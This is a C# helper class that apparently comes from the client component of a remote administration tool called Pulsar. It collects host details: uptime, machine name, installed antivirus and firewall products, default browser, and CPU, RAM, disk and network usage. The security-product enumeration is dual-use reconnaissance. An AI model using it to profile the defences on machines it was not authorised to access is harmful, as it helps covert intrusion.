using Microsoft.Win32;
using Pulsar.Common.Helpers;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Management;
using System.Diagnostics;
using System.IO;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using Microsoft.Win32;
namespace Pulsar.Client.Helper
{
    public static class SystemHelper
    {
        // ------------------------------------------------------------
        // UPTIME
        // ------------------------------------------------------------
        public static string GetUptime()
        {
            try
            {
                var explorers = Process.GetProcessesByName("explorer");
                if (explorers.Length > 0)
                {
                    var oldest = explorers.OrderBy(p => p.StartTime).First();
                    TimeSpan up = DateTime.Now - oldest.StartTime;
                    return $"{up.Days}d : {up.Hours}h : {up.Minutes}m : {up.Seconds}s";
                }
            }
            catch { }

            TimeSpan fallback = TimeSpan.FromMilliseconds(Environment.TickCount);
            return $"{fallback.Days}d : {fallback.Hours}h : {fallback.Minutes}m : {fallback.Seconds}s";
        }

        public static string GetPcName() => Environment.MachineName;

        // ------------------------------------------------------------
        // ANTIVIRUS
        // ------------------------------------------------------------
        public static string GetAntivirus()
        {
            try
            {
                string result = string.Empty;

                using (var searcher = new ManagementObjectSearcher("root\\SecurityCenter2", "SELECT * FROM AntivirusProduct"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                        result += obj["displayName"] + "; ";
                }

                result = StringHelper.RemoveLastChars(result);
                return string.IsNullOrEmpty(result) ? "N/A" : result;
            }
            catch { return "Unknown"; }
        }

        // ------------------------------------------------------------
        // FIREWALL
        // ------------------------------------------------------------
        public static string GetFirewall()
        {
            try
            {
                string result = string.Empty;

                using (var searcher = new ManagementObjectSearcher("root\\SecurityCenter2", "SELECT * FROM FirewallProduct"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                        result += obj["displayName"] + "; ";
                }

                result = StringHelper.RemoveLastChars(result);
                return string.IsNullOrEmpty(result) ? "N/A" : result;
            }
            catch { return "Unknown"; }
        }

        // ------------------------------------------------------------
        // DEFAULT BROWSER
        // ------------------------------------------------------------
        public static string GetDefaultBrowser()
        {
            try
            {
                const string keyPath = @"Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice";

                using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(keyPath))
                {
                    string progId = key?.GetValue("ProgId")?.ToString() ?? "";
                    if (string.IsNullOrEmpty(progId))
                        return "-";

                    var map = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
                    {
                        { "ChromeHTML", "Google Chrome" },
                        { "MSEdgeHTM", "Microsoft Edge" },
                        { "IE.HTTP", "Internet Explorer" },
                        { "FirefoxURL", "Mozilla Firefox" },
                        { "BraveHTML", "Brave" },
                        { "OperaStable", "Opera" },
                        { "VivaldiHTM", "Vivaldi" }
                    };

                    foreach (var kvp in map)
                        if (progId.StartsWith(kvp.Key, StringComparison.OrdinalIgnoreCase))
                            return kvp.Value;

                    return progId.Split('-')[0].Replace("URL", "").Replace("HTML", "").Trim();
                }
            }
            catch { }

            return "-";
        }

        // =====================================================================
        // NEW SYSTEM METRICS (Fully Compatible)
        // =====================================================================

        // ------------------------------------------------------------
        // CPU USAGE %
        // ------------------------------------------------------------
        public static float GetCpuUsage()
        {
            try
            {
                using (var cpu = new PerformanceCounter("Processor", "% Processor Time", "_Total"))
                {
                    cpu.NextValue();
                    System.Threading.Thread.Sleep(250);
                    return cpu.NextValue();
                }
            }
            catch { return -1; }
        }

        // ------------------------------------------------------------
        // RAM USAGE (Native Win32: MEMORYSTATUSEX)
        // ------------------------------------------------------------

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        private class MEMORYSTATUSEX
        {
            public uint dwLength = (uint)Marshal.SizeOf(typeof(MEMORYSTATUSEX));
            public uint dwMemoryLoad;
            public ulong ullTotalPhys;
            public ulong ullAvailPhys;
            public ulong ullTotalPageFile;
            public ulong ullAvailPageFile;
            public ulong ullTotalVirtual;
            public ulong ullAvailVirtual;
            public ulong ullAvailExtendedVirtual;
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        private static extern bool GlobalMemoryStatusEx([In, Out] MEMORYSTATUSEX buffer);

        public static (float usedMB, float totalMB, float percent) GetRamUsage()
        {
            try
            {
                var mem = new MEMORYSTATUSEX();
                GlobalMemoryStatusEx(mem);

                float total = mem.ullTotalPhys / 1024f / 1024f;
                float available = mem.ullAvailPhys / 1024f / 1024f;
                float used = total - available;
                float percent = (used / total) * 100f;

                return (used, total, percent);
            }
            catch
            {
                return (0, 0, 0);
            }
        }

        // ------------------------------------------------------------
        // DISK USAGE % (System Drive)
        // ------------------------------------------------------------
        public static (long freeMB, long totalMB, float percentUsed) GetDiskUsage()
        {
            try
            {
                var drive = new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory));

                long total = drive.TotalSize / 1024 / 1024;
                long free = drive.AvailableFreeSpace / 1024 / 1024;
                long used = total - free;

                float percent = (float)used / total * 100f;

                return (free, total, percent);
            }
            catch { return (0, 0, 0); }
        }

        // ------------------------------------------------------------
        // NETWORK USAGE (bytes/sec up/down)
        // ------------------------------------------------------------
        public static (long sentPerSec, long recvPerSec) GetNetworkUsage()
        {
            try
            {
                long sent1 = 0, recv1 = 0;

                foreach (var nic in NetworkInterface.GetAllNetworkInterfaces())
                {
                    var s = nic.GetIPv4Statistics();
                    sent1 += s.BytesSent;
                    recv1 += s.BytesReceived;
                }

                System.Threading.Thread.Sleep(1000);

                long sent2 = 0, recv2 = 0;

                foreach (var nic in NetworkInterface.GetAllNetworkInterfaces())
                {
                    var s = nic.GetIPv4Statistics();
                    sent2 += s.BytesSent;
                    recv2 += s.BytesReceived;
                }

                return (sent2 - sent1, recv2 - recv1);
            }
            catch { return (0, 0); }
        }
    }
}
